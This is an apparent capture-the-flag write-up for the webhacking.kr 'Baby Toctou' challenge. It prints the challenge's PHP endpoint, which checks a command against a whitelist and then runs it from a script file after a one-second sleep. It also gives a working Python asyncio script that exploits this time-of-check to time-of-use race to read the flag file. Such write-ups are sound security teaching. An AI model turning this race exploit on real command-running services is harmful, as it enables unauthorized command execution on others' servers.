# Baby Toctou    Race Condition

URL: [http://webhacking.kr:10019](http://webhacking.kr:10019)

```php
WebShell [Version 1.0.00000.001]  
  
WebShell:/ $ help  
only "ls", "cat api.php", "cat index.php" allowed  
WebShell:/ $ ls  
api.php  
flag.php  
index.php  
user  
  
WebShell:/ $ cat api.php  
<?php  
	// system($_GET['q']);
	if (!preg_match('/^[a-f0-9]+$/', $_COOKIE["baby_toctou"])) {
	    $newCookie = uniqid() . rand(1, 999999999);
	    setcookie("baby_toctou", $newCookie);
	    $_COOKIE["baby_toctou"] = $newCookie;
	}
	$cmd = $_GET["q"];
	($myfile = fopen("user/{$_COOKIE["baby_toctou"]}.sh", "w")) or die("Unable to open file!");
	fwrite($myfile, $cmd);
	fclose($myfile);
	if ($cmd === "ls" || $cmd === "cat api.php" || $cmd === "cat index.php") {
	    // valid check
	    sleep(1); // my server is small and weak
	    system("sh ./user/{$_COOKIE["baby_toctou"]}.sh");
	} else {
	echo <<<HELP  
only "ls", "cat api.php", "cat index.php" allowed  
HELP;  
	}
?>  
WebShell:/ $
```

Looks like we have **Race Condition**, because of **sleep** before **system**. First we make good request, followed by bad request. Good request will go into *valid check* and sleep for 1 second, bad request within this timeframe will write malicious payload into the script file and good request will execute whatever bad has written.

We can easily achieve this using `asyncio` requests using Python:
```python
import asyncio
from aiohttp import ClientSession

URL = 'http://webhacking.kr:10019/api.php'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f', 'baby_toctou': '66ad3428be225940016037'}

async def fetch(session, payload):
    async with session.get(URL, params={'q': payload}, cookies=COOKIES) as resp:
        return await resp.text()

async def main():
    async with ClientSession() as session:
        tasks = [fetch(session, q) for q in ('ls', 'ls -alh')]
        results = await asyncio.gather(*tasks)
        for result in results:
            print(result)

if __name__ == '__main__':
    asyncio.run(main())
```

```bash
➜ py .\race.py
total 1.8M
drwxr-xr-x 3 root root 4.0K Mar 22  2023 .        
drwxr-xr-x 3 root root 4.0K Aug 24  2019 ..       
-rw-r--r-- 1 root root  653 Mar 22  2023 api.php  
-rw-r--r-- 1 root root   57 Mar 21  2023 flag.php 
-rw-r--r-- 1 root root 3.2K Mar 21  2023 index.php
drwxrwxrwx 2 root root 1.8M Aug  3 04:40 user     

only "ls", "cat api.php", "cat index.php" allowed
```

Change tasks in code to 
```python
        tasks = [fetch(session, q) for q in ('ls', 'cat flag.php')]
```

And get the flag:
```bash
➜ py .\race.py
<?php
  $flag = "FLAG{Mama_i_know_how_toctou_works}";
?>

only "ls", "cat api.php", "cat index.php" allowed
```

---

`toctue` turns out means `Time-of-check to time-of-use`

[https://omni.wikiwand.com/en/articles/Time-of-check_to_time-of-use](https://omni.wikiwand.com/en/articles/Time-of-check_to_time-of-use)

